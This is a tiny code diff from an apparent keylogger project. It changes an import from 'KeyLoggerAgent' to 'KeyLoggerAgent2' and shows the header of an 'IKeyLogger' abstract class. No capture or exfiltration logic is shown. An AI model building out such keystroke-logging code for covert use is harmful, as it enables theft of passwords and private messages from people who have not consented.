@@ -1,7 +1,7 @@
 from abc import ABC, abstractmethod
 from typing import List
 import time
-from KeyLoggerAgent import Listener, logged_keys
+from KeyLoggerAgent2 import Listener, logged_keys
 
 
 class IKeyLogger(ABC):
